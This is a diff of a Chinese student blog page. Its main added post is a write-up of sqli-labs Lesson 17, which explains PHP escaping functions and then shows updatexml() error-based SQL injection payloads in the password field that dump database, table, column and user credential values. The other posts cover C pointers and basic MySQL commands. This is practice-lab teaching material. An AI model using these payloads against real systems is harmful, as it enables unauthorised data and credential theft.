@@ -64,6 +64,97 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-lesson17" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/31/lesson17/" class="article-date">
+  <time datetime="2021-01-31T13:26:30.000Z" itemprop="datePublished">2021-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/31/lesson17/">lesson17</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="lesson17："><a href="#lesson17：" class="headerlink" title="lesson17："></a>lesson17：</h1><p>这一关不管我们在username上构造什么payload都无法篡改数据库。</p>
+<p>我们查看源码：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="先认识一下陌生函数："><a href="#先认识一下陌生函数：" class="headerlink" title="先认识一下陌生函数："></a>先认识一下陌生函数：</h4><h5 id="1-get-magic-quotes-gpc-函数"><a href="#1-get-magic-quotes-gpc-函数" class="headerlink" title="1.get_magic_quotes_gpc()函数"></a>1.get_magic_quotes_gpc()函数</h5><p>get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。</p>
+<p>注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。</p>
+<h5 id="2-addslashes-函数"><a href="#2-addslashes-函数" class="headerlink" title="2.addslashes()函数"></a>2.addslashes()函数</h5><p>addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\的字符串。</p>
+<h5 id="3-stripslashes-函数"><a href="#3-stripslashes-函数" class="headerlink" title="3.stripslashes()函数"></a>3.stripslashes()函数</h5><p>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
+<p>注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。</p>
+<h5 id="4-ctype-digit-函数"><a href="#4-ctype-digit-函数" class="headerlink" title="4.ctype_digit()函数"></a>4.ctype_digit()函数</h5><p>ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。</p>
+<h5 id="5-mysql-real-escape-string-函数"><a href="#5-mysql-real-escape-string-函数" class="headerlink" title="5.mysql_real_escape_string()函数"></a>5.mysql_real_escape_string()函数</h5><p>转义 SQL 语句中使用的字符串中的特殊字符：<img src="/2021/01/31/lesson17/1.png" alt="1"></p>
+<p><strong>sp：</strong>怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。</p>
+<p>我们观察源码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[&#x27;uname&#x27;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$<span class="keyword">update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。</p>
+<p>输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’  ;</p>
+<p><strong>！这里介绍一个注入方法：</strong></p>
+<h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><h5 id="A-常用函数："><a href="#A-常用函数：" class="headerlink" title="A.常用函数："></a>A.常用函数：</h5><h6 id="1-updatexml-函数："><a href="#1-updatexml-函数：" class="headerlink" title="1.updatexml()函数："></a>1.updatexml()函数：</h6><p>updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—-</p>
+<p>第一个参数：xml_document， String格式，为XML文档对象的名称；</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)；</p>
+<p>第三个参数：new_value， String格式，替换查找到的符合条件的数据；</p>
+<p>该函数的作用就是把xml文档中的指定字符串替换成新值。</p>
+<p><img src="/2021/01/31/lesson17/2.png" alt="2"></p>
+<h6 id="2-extractvalue-函数："><a href="#2-extractvalue-函数：" class="headerlink" title="2.extractvalue()函数："></a>2.extractvalue()函数：</h6><p>extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。</p>
+<h5 id><a href="#" class="headerlink" title></a><img src="/2021/01/31/lesson17/3.png" alt="3"></h5><h5 id="B-报错注入原理："><a href="#B-报错注入原理：" class="headerlink" title="B.报错注入原理："></a>B.报错注入原理：</h5><p>(1)参数xpath需要的是xpath格式的字符串，不是就会报错。</p>
+<p>(2))当xpath路径语法错误时，就会报错。</p>
+<p>注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。</p>
+<p>懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。</p>
+<h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=(anything)&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;, database()),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/4.png" alt="4"></p>
+<p>注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。</p>
+<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/5.png" alt="5"></p>
+<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/6.png" alt="6"></p>
+<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=root</span><br><span class="line">password=&#x27; or updatexml(1,concat(&#x27;<span class="comment">#&#x27;,(select * from (select concat_ws</span></span><br><span class="line">(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>得：<img src="/2021/01/31/lesson17/7.png" alt="7"></p>
+<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.爆值的时候需要注意，不能直接用简单的<code>select concat(username)</code>，这样会引起报错：<img src="/2021/01/31/lesson17/8.png" alt="8"></p>
+<p>原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。</p>
+<p><img src="/2021/01/31/lesson17/9.png" alt="9"></p>
+<p>2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制</p>
+<p>回显内容。</p>
+<p><strong>sp：回顾一下字符串连接函数</strong></p>
+<p><strong>1.concat(str1,str2,…)——没有分隔符地连接字符串</strong><br><strong>2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串</strong><br><strong>3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/31/lesson17/" data-id="ckozphtun002lzsvu16z9avsc" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-lesson11-16" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/01/30/lesson11-16/" class="article-date">
@@ -307,49 +398,6 @@
 
 
   
-    <article id="post-blog9" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/12/24/blog9/" class="article-date">
-  <time datetime="2020-12-24T08:41:40.000Z" itemprop="datePublished">2020-12-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/24/blog9/">C语言的解题思路</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h6 id="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"><a href="#学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。" class="headerlink" title="学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。"></a>学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。</h6><p>1.绝对偏差最小问题。</p>
-<p>【题目】</p>
-<p>输入某班级n(0&lt;n&lt; 100)个学生的成绩到数组a中，查找出所有成绩中与及格线(60分)绝对偏差最小的学生成绩，并输出该学生的成绩。</p>
-<p>【思路】</p>
-<p>先定义一个数组a[100],用for语句算出每一个数与60差的绝对值，然后定义一个变量m去存储最小绝对偏差值，同时用定义变量k去记存当绝对偏差值最小时i的值。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/24/blog9/" data-id="ckozphtug0021zsvu1ddg7vc2" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
     <article id="post-blog j" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/12/13/blog%20j/" class="article-date">
@@ -532,62 +580,6 @@
 
 
   
-    <article id="post-blog8" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/12/01/blog8/" class="article-date">
-  <time datetime="2020-12-01T13:08:21.000Z" itemprop="datePublished">2020-12-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/01/blog8/">第六章</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="一-指针与指针变量"><a href="#一-指针与指针变量" class="headerlink" title="一.指针与指针变量"></a>一.指针与指针变量</h4><p>1.指针就是变量的地址。</p>
-<p>2.指针变量的定义：类型标识符   *标识符；如：int   *p。这句话将p定义为指针变量；p代表一个地址。</p>
-<p>注：a.一个指针变量只能指向类型相同的变量。</p>
-<p>​        b.如果存在“int i， *p=&amp;i（定义的p为指针变量的同时将i的地址赋值给p，指针变量p就指向了i，即 *p等价于i）；”。那么 *p等价于i等价于 *&amp;i；&amp; *p等价于&amp;i等价于p。观察发现指针运算符和取地址符共同作用时，会相互抵消。</p>
-<h4 id="二-指针运算"><a href="#二-指针运算" class="headerlink" title="二.指针运算"></a>二.指针运算</h4><p>1.指针运算符“ * ”与自增，自减运算符均为单目运算，运算级相同，则运算方向为自右向东。</p>
-<p>三.指针和二维数组</p>
-<p>1.假设a为二维数组，a既是数组名也是二维数组的首地址，相当于a[0] [0]。a+1表示a[1] [0];*a+1表示a[0] [1]。</p>
-<p>2.假设有程序语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5] , (*p)[5],i,j;</span><br><span class="line">p&#x3D;a;</span><br></pre></td></tr></table></figure>
-
-<p>则存在以下等阶：<em>（p[i]+j)  等于 * (* (p+i)+j)   等于  (</em>(p+i ) )[j] 等于  p[i] [j] 等于  a[i] [j] 。</p>
-<p>3.假设有程序语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5],i,j,*p[3];</span><br><span class="line">for (i&#x3D;0;i&lt;3;i++) p[i]&#x3D;a[i];&#x2F;&#x2F;p[i] 相当于每一行的首地址</span><br></pre></td></tr></table></figure>
-
-<p>则存在以下等阶：*(p[i]+j) 等于 *( *(p+i)+j)  等于 ( *(p+i )) [ j ] 等于 p[i] [j] 等于 a[i] [j]。</p>
-<h4 id="三-复合"><a href="#三-复合" class="headerlink" title="三.复合"></a>三.复合</h4><h5 id="1-指向指针的指针变量定义："><a href="#1-指向指针的指针变量定义：" class="headerlink" title="1.指向指针的指针变量定义："></a>1.指向指针的指针变量定义：</h5><p>语法格式：类型标识符   ** 指针变量名。    **指针变量名等阶于 *( *指针变量名)</p>
-<h5 id="2-指向结构体数组的指针变量"><a href="#2-指向结构体数组的指针变量" class="headerlink" title="2.指向结构体数组的指针变量:"></a>2.指向结构体数组的指针变量:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">struct booktp</span><br><span class="line">	&#123;</span><br><span class="line">		char name[60];</span><br><span class="line">		char author[30];</span><br><span class="line">		float price;</span><br><span class="line">		struct datetp</span><br><span class="line">		&#123;</span><br><span class="line">			unsigned year;</span><br><span class="line">			unsigned month;</span><br><span class="line">		&#125;pubday;</span><br><span class="line">	&#125;;</span><br><span class="line">	struct booktp *p,book[3];</span><br><span class="line">	p&#x3D;book;&#x2F;&#x2F;p指向book的首地址，即book[0];</span><br><span class="line">	且book[0].price &#x3D; p-&gt;price &#x3D; (*p).price</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/01/blog8/" data-id="ckozphtue001wzsvuf33s8bfe" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
     <article id="post-blog g" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/29/blog%20g/" class="article-date">
@@ -675,11 +667,55 @@
 
 
   
+    <article id="post-blog f" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/28/blog%20f/" class="article-date">
+  <time datetime="2020-11-28T14:35:29.000Z" itemprop="datePublished">2020-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/28/blog%20f/">MySQL</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>一.基本的使用</p>
+<p>1.查看有哪些数据库：show database；</p>
+<p>2.调用security数据库：use security；</p>
+<p>3.查看被调用的数据库中有哪些表名：show tables；</p>
+<p>4.查看表的结构，如：desc  email；</p>
+<p>5.查看表的内容：select *form 表名；</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/28/blog%20f/" data-id="ckozphtu40016zsvu94bu44un" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -693,7 +729,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ISCC/" rel="tag">ISCC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ISCC/" rel="tag">ISCC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
     </div>
   </div>
 
@@ -703,7 +739,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 14px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 16px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/ISCC/" style="font-size: 10px;">ISCC</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 18px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA-labs/" style="font-size: 15px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/ISCC/" style="font-size: 10px;">ISCC</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 17.5px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
     </div>
   </div>
 
@@ -712,7 +748,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -723,6 +759,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/06/06/CTF%E5%B7%A5%E5%85%B7%E7%94%A8%E6%B3%95/">CTF工具用法</a>
